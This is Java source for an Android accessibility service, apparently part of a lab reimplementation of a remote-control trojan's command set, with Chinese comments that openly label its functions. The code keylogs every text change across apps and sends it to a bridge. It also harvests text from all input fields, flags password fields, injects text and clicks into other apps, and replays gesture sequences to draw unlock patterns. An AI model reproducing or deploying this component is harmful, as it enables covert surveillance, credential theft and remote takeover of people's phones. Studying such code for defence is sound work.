package com.ref.labagent;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * 无障碍服务：真机 UI 树（带文字）、手势、全局按键、往输入框写字、读输入框内容。
 *
 * 这一层是"必须 App 组件才能做"的那批指令的落点：
 * 键盘记录（读输入框文字）、注入类（点控件/写输入框）、图案解锁（手势）、
 * 无障碍开关、catAllViewSwitch（读全窗口）等。
 */
public class AccService extends AccessibilityService {

    private static AccService INSTANCE;

    public static AccService get() { return INSTANCE; }

    public static boolean isEnabled(Context c) {
        String s = Settings.Secure.getString(c.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return s != null && s.contains(c.getPackageName() + "/" + AccService.class.getName());
    }

    public static void openSettings(Context c) {
        Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        c.startActivity(i);
    }

    /** 供 Python 侧（root）用 settings put 直接打开/关闭本服务时使用的组件名 */
    public static String component(Context c) {
        return c.getPackageName() + "/" + AccService.class.getName();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        INSTANCE = this;
    }

    @Override
    public void onDestroy() {
        INSTANCE = null;
        super.onDestroy();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) {
            return;
        }
        try {
            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence t = e.getText() != null && e.getText().size() > 0 ? e.getText().get(0) : null;
                String pkg = e.getPackageName() == null ? "" : e.getPackageName().toString();
                if (t != null && t.length() > 0) {
                    Bridge.pushKeylog(pkg, t.toString());
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @Override
    public void onInterrupt() {
    }

    // ---------------------------------------------------------------- 能力

    /** 读当前窗口的 UI 树（带文字）—— 比 uiautomator dump 可靠，也不要求系统 idle */
    public JSONObject dumpTree(int maxDepth) {
        JSONObject root = new JSONObject();
        try {
            AccessibilityNodeInfo n = getRootInActiveWindow();
            if (n == null) {
                return root;
            }
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            root.put("w", r.right - r.left);
            root.put("h", r.bottom - r.top);
            root.put("pkg", n.getPackageName() == null ? "" : n.getPackageName().toString());
            JSONArray arr = new JSONArray();
            walk(n, arr, 0, maxDepth <= 0 ? 40 : maxDepth);
            root.put("nodes", arr);
            root.put("count", arr.length());
        } catch (Throwable t) {
            try { root.put("error", t.toString()); } catch (Throwable ignored) {}
        }
        return root;
    }

    private void walk(AccessibilityNodeInfo n, JSONArray out, int depth, int maxDepth) {
        if (n == null || depth > maxDepth || out.length() >= 800) {
            return;
        }
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0) {
                JSONObject o = new JSONObject();
                JSONArray b = new JSONArray();
                b.put(r.left).put(r.top).put(r.right).put(r.bottom);
                o.put("b", b);
                o.put("cls", n.getClassName() == null ? "" : n.getClassName().toString());
                o.put("id", n.getViewIdResourceName() == null ? "" : n.getViewIdResourceName());
                CharSequence tx = n.getText();
                CharSequence ds = n.getContentDescription();
                o.put("text", tx == null ? "" : tx.toString());
                o.put("desc", ds == null ? "" : ds.toString());
                o.put("click", n.isClickable());
                o.put("edit", n.isEditable());
                o.put("pwd", n.isPassword());
                out.put(o);
            }
        } catch (Throwable ignored) {
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            walk(n.getChild(i), out, depth + 1, maxDepth);
        }
    }

    /** 读所有输入框里现有的文字（键盘记录） */
    public JSONArray readEdits() {
        JSONArray out = new JSONArray();
        try {
            AccessibilityNodeInfo n = getRootInActiveWindow();
            collectEdits(n, out, 0);
        } catch (Throwable ignored) {
        }
        return out;
    }

    private void collectEdits(AccessibilityNodeInfo n, JSONArray out, int depth) {
        if (n == null || depth > 40) {
            return;
        }
        try {
            if (n.isEditable() && n.getText() != null && n.getText().length() > 0) {
                JSONObject o = new JSONObject();
                Rect r = new Rect();
                n.getBoundsInScreen(r);
                o.put("text", n.getText().toString());
                o.put("pkg", n.getPackageName() == null ? "" : n.getPackageName().toString());
                o.put("id", n.getViewIdResourceName() == null ? "" : n.getViewIdResourceName());
                JSONArray b = new JSONArray();
                b.put(r.left).put(r.top).put(r.right).put(r.bottom);
                o.put("b", b);
                out.put(o);
            }
        } catch (Throwable ignored) {
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            collectEdits(n.getChild(i), out, depth + 1);
        }
    }

    /** 往当前聚焦的输入框写文字（原版 inputSend / clickInput） */
    public boolean setText(String text) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            AccessibilityNodeInfo focus = root == null ? null : root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focus == null) {
                return false;
            }
            android.os.Bundle args = new android.os.Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            return focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        } catch (Throwable t) {
            return false;
        }
    }

    /** 按 id/文本找控件并点它（注入类：点"下一步"、点输入框等） */
    public boolean clickBy(String idOrText) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                return false;
            }
            List<AccessibilityNodeInfo> hits = new ArrayList<>();
            if (idOrText.startsWith("id:")) {
                hits = root.findAccessibilityNodeInfosByViewId(idOrText.substring(3));
            } else {
                hits = root.findAccessibilityNodeInfosByText(idOrText);
            }
            for (AccessibilityNodeInfo n : hits) {
                AccessibilityNodeInfo c = n;
                while (c != null && !c.isClickable()) {
                    c = c.getParent();
                }
                if (c != null && c.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true;
                }
                if (n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    /** 手势：把点序列连成一条路径（点击 = 单点，滑动 = 两点，图案解锁 = 多点） */
    public boolean gesture(float[] xs, float[] ys, long duration, int[] holdMs) {
        try {
            if (xs == null || xs.length == 0) {
                return false;
            }
            if (xs.length == 1) {
                Path p = new Path();
                p.moveTo(xs[0], ys[0]);
                GestureDescription.Builder b = new GestureDescription.Builder();
                b.addStroke(new GestureDescription.StrokeDescription(p, 0,
                        Math.max(1, duration > 0 ? duration : 60)));
                return dispatchGesture(b.build(), null, null);
            }
            // 多点（图案解锁）：逐段点按，段与段之间留一点时间
            GestureDescription.Builder b = new GestureDescription.Builder();
            long t = 0;
            for (int i = 0; i < xs.length; i++) {
                Path p = new Path();
                p.moveTo(xs[i], ys[i]);
                long d = (holdMs != null && i < holdMs.length) ? holdMs[i] : 40;
                b.addStroke(new GestureDescription.StrokeDescription(p, t, Math.max(1, d)));
                t += d + 30;
            }
            return dispatchGesture(b.build(), null, null);
        } catch (Throwable t) {
            return false;
        }
    }

    /** 全局动作：home/back/recents/通知栏/锁屏 */
    public boolean global(String name) {
        int a;
        if ("back".equals(name)) {
            a = GLOBAL_ACTION_BACK;
        } else if ("home".equals(name)) {
            a = GLOBAL_ACTION_HOME;
        } else if ("recents".equals(name)) {
            a = GLOBAL_ACTION_RECENTS;
        } else if ("notifications".equals(name)) {
            a = GLOBAL_ACTION_NOTIFICATIONS;
        } else if ("lockscreen".equals(name) && Build.VERSION.SDK_INT >= 28) {
            a = GLOBAL_ACTION_LOCK_SCREEN;
        } else if ("screenshot".equals(name) && Build.VERSION.SDK_INT >= 28) {
            a = GLOBAL_ACTION_TAKE_SCREENSHOT;
        } else {
            return false;
        }
        try {
            return performGlobalAction(a);
        } catch (Throwable t) {
            return false;
        }
    }

    /** 当前前台包（无障碍视角，不会因为 dumpsys 文案变化而失灵） */
    public String foregroundPkg() {
        try {
            AccessibilityNodeInfo n = getRootInActiveWindow();
            if (n != null && n.getPackageName() != null) {
                return n.getPackageName().toString();
            }
        } catch (Throwable ignored) {
        }
        return "";
    }

}
